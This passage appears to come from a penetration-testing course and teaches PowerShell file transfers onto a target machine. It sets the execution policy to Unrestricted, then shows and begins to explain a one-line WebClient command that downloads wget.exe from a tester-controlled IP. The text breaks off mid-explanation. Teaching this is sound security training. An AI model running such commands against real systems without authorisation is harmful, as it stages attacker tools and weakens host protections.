```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> **Set-ExecutionPolicy Unrestricted**

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing
the execution policy might expose you to the security risks described in the
about_Execution_Policies help topic at https://go.microsoft.com/fwlink/?LinkID=135170.
Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N")
: y

PS C:\WINDOWS\system32> **Get-ExecutionPolicy**
Unrestricted
```

*Listing 101 - Setting the PowerShell execution policy*

PowerShell is both responsive and powerful, enabling us to perform multiple tasks without installing additional tools on the target. Let’s explore PowerShell a bit more to demonstrate how it might come into play during a penetration test.

# 4.3.1 PowerShell File Transfers

Continuing with Alice and Bob, we will transfer a file from Bob to Alice using PowerShell.

Because of the power and flexibility of PowerShell, this is not as straight-forward as it would be with Netcat or even socat, making these first few commands a bit confusing at first glance. We will execute the command and then break down the components:

```
C:\Users\offsec> **powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\\Users\\offsec\\Desktop\\wget.exe')"**

C:\Users\offsec\Desktop> **wget.exe -V**
GNU Wget 1.9.1

Copyright (C) 2003 Free Software Foundation, Inc.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

**Originally written by Hrvoje Niksic <hniksic@xacmacs.org>.**
```

*Listing 102 - Using PowerShell to download a file*

We can see that the command executed, the file was transferred, and it executes without incident. Let’s analyze the PowerShell command that made this happen.

First, we used the `-c` option. This will execute the supplied command (wrapped in double-quotes) as if it were typed at the PowerShell prompt.

The command we are executing contains several components. First, we are using the "new-object" cmdlet, which allows us to instantiate either a .Net Framework or a COM object. In this case, we are creating an instance of the WebClient class, which is defined and implemented in the System.Net namespace. The WebClient class is used to access resources identified by a URI and it